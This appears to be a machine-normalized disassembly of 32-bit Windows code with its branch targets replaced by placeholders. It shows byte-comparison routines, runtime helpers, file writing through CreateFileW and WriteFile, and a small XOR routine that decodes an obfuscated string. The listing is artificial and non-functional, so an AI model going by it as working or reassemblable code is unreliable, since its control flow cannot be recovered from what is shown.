cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_10005a0c
push 0x14
push r--data
call sub_1007fb20
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_100427ff
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1007fb65
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10013b34
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004846a
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10005aec
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_10005b00
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
xor eax eax
push esi
test edx edx
je r-xdata
or eax 0xffffffff
mov ecx [ ecx ]
mov esi [ ebp + 0xc ]
pop esi
pop ebp
retn
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
cmp [ ecx ] esi
je r-xdata
sub_10005b27
push 0x5c
mov eax sub_10086110
call sub_1003fae8
fldz
mov eax [ ebp + 0x18 ]
fld [ ebp + 0x20 ]
mov esi [ ebp + 0x8 ]
fcom st1
mov [ ebp - 0x64 ] eax
xor ebx ebx
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x60 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x60 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1005c1c5
add esp 0x14
xor edi edi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_1004ca10
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_10007470
push [ ebp - 0x60 ]
mov ecx [ ebp - 0x68 ]
push [ ebp + 0x1c ]
push [ ebp - 0x64 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1004970f
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1002c8c0
mov eax esi
call sub_1004642f
retn 0x20
movzx eax [ ebp + edi - 0x38 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1004ca10
inc edi
cmp edi [ ebp - 0x5c ]
jl r-xdata
sub_10005c30
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
push edi
push 0x80
push 0x2
push edi
push edi
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push edi
lea ecx [ ebp - 0x4 ]
push ecx
push edx
push eax
push esi
mov [ ebp - 0x4 ] edi
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
lea eax [ edi + 0x1 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push esi
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov edi 0x2
sub_10005c99
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_1004a330
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1006c9ca
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ax [ ebp - 0x4 ]
cmp [ ebp + 0x12 ] ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1006c9ca
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1006c9ca
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_10005d80
cmp [ esi ] 0x0
je r-xdata
retn
push ebx
mov ebx [ LocalFree@IAT ]
push edi
lea ecx [ ecx ]
mov ecx [ esi ]
push ecx
call ebx
mov [ esi ] edi
test edi edi
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov eax [ esi ]
mov edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
je r-xdata
pop edi
pop ebx
sub_10005db3
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
mov [ ebp - 0x4 ] ax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x22
call sub_10062fa9
push [ eax + 0x14 ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x30
pop edi
jne r-xdata
xor eax eax
cmp [ ebp - 0x4 ] 0x31
jne r-xdata
push 0x2
pop eax
leave
retn
cmp [ ebp - 0x4 ] 0x32
setne al
dec eax
and eax 0x3
leave
retn
inc eax
leave
retn
sub_10005e10
push ebp
mov ebp esp
push 0xffffffff
push sub_10088361
mov eax [ fs : 0x0 ]
push eax
sub esp 0xcc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov ebx ecx
lea ecx [ ebp - 0xd4 ]
push edi
push ecx
mov esi edx
mov [ ebp - 0xd8 ] eax
call sub_10022b70
mov edx esi
push eax
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x0
call sub_1001ccb0
push eax
mov edx r--data
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x1
call sub_1001ccb0
push eax
mov edx ebx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_1001ccb0
push eax
mov edx r--data
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call sub_1001ccb0
mov edx [ ebp - 0xd8 ]
push eax
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4
call sub_1001ccb0
push eax
mov edx r--data
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x5
call sub_1001ccb0
add esp 0x24
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x6
call sub_100649e0
mov esi 0x8
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ebx ebx
xor eax eax
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] ax
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
cmp [ ebp - 0x6c ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x6c ] 0x7
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] dx
cmp [ ebp - 0xa4 ] esi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] cx
cmp [ ebp - 0xc0 ] esi
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_100187af
add esp 0x4
inc [ edi + 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0xd4 ]
push edx
call sub_100187af
add esp 0x4
sub_10006000
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x68
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x24 ]
push edx
mov ecx esi
call sub_1005ddc0
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_1001a2f0
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_100060f2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1007ec90
add esp 0xc
call sub_1006299d
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_100427ff
mov eax esi
jmp r-xdata
sub_10006150
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] edx
call sub_10070110
add esp 0x4
test eax eax
mov eax 0x2
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
call sub_10029b50
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x208
lea ecx [ ebp - 0x20c ]
push 0x0
push ecx
call sub_1007f940
lea edx [ ebp - 0x210 ]
push edx
call sub_10065cb8
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
lea ebx [ ecx + eax + 0x1082c ]
add esp 0x10
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
